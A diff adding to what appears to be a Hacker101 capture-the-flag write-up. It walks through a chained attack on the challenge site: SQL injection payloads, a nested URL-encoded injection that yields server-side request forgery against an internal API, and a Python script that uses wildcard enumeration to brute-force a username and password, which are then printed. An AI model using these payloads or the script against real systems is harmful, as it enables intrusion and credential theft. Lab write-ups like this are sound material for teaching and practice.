@@ -353,3 +353,77 @@ When decoding one of the file names: `eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3
 
 When enumerating the number of columns, with 3 three columns, there will be output:</br>
 `/r3c0n_server_4fdk59/album?hash=-1' union select 1,2,3 -- -`</br>
+
+Enumerating the photo table with:</br> 
+`/r3c0n_server_4fdk59/album?hash=-1' UNION ALL SELECT 1, 2, group_concat(album_id,",",id,",",photo,";\n") from photo-- -`</br>
+showed how things where stored.</br>
+```
+1,1,0a382c6177b04386e1a45ceeaa812e4e.jpg; ,
+1,2,1254314b8292b8f790862d63fa5dce8f.jpg; ,
+2,3,32febb19572b12435a6a390c08e8d3da.jpg; ,
+3,4,db507bdb186d33a719eb045603020cec.jpg; ,
+3,5,9b881af8b32ff07f6daada95ff70dc3a.jpg; ,
+3,6,13d74554c30e1069714a5a9edda8c94d.jpg;
+```
+
+Trying the below script to concatenate queries, resulted in a bad request:</br>
+`/r3c0n_server_4fdk59/album?hash=asdasd' UNION SELECT "4' UNION SELECT 1,2,\"0a382c6177b04386e1a45ceeaa812e4e.jpg\";/*",1,1;/*`
+
+In the request itself it shows that some fields are also not shown as red, as the rest of the value.</br>
+When URL encoding the value, it worked:</br>
+`/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,2,\%220a382c6177b04386e1a45ceeaa812e4e.jpg\%22;/*%22,1,1;/*`</br>
+Note that the hash of the picture, should not exist, otherwise it will show `400 - Bad request`</br>
+
+To check if a picture is including via http request or direct inclusion:</br>
+`/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,1,\%220a382c6177b04386e1a45ceeaa812e4e.jpg?whatever%3d1\%22;/*%22,1,1;/*`</br>
+The above payload worked, hence it is a SSRF via sqli within another sqli.</br>
+
+Try to call the api with ssrf:</br>
+`/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,2,\%22../api/hello\%22;/*%22,1,1;/*`</br>
+This resulted in a 404 error, not a 401 anymore.</br>
+Changing `hello` to `user`, gave a 200, not a 401 error anymore</br>
+
+Trying to append `username=blah` after the `api/user` endpoint, resulted in a 404, hence user enumeration can be performed:</br>
+`/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,2,\%22../api/user?username=blah\%22;/*%22,1,1;/*`</br>
+
+Trying to append `username=%25` after the `api/user` endpoint, did not result in a 404 and wildcards are accepted, hence user enumeration can be performed quicker:</br>
+`/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,2,\%22../api/user?username=blah\%22;/*%22,1,1;/*`</br>
+
+Running the below script will find a relevant user:
+```
+#!/usr/bin/env python3
+import requests
+from bs4 import BeautifulSoup as BSHTML
+
+start=''
+alphabet='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-'
+
+def guess(start):
+    for letter in alphabet:
+        attempt=start+letter
+        url = f'''https://6fc6375ff9975510296dc4e2b4275663.ctf.hacker101.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,1,\%22../api/user?username={attempt}%25\%22;/*%22,1,1;/*'''
+        r = requests.get(url)
+        print(r)
+        soup = BSHTML(r.text, "html.parser")
+        images = soup.findAll('img')
+        print(images)
+        r = requests.get("https://6fc6375ff9975510296dc4e2b4275663.ctf.hacker101.com" + images[1]["src"])
+        if len(r.text) != 39:
+            return attempt
+    return start
+
+updated=guess(start)
+while updated != start:
+    start = updated
+    updated=guess(start)
+    print("nearly there: " + updated)
+
+print("found: " + updated)
+```
+This resulted in a username: `grindadmin`</br>
+
+Adjusting the above code and replacing `?username={attempt}` with `?username=grinchadmin&password={attempt}` resulted in the password: `s4nt4sucks`</br>
+Now it is possible to log in with `grinchadmin:s4nt4sucks`</br>
+
+## Solution 12th flag
+
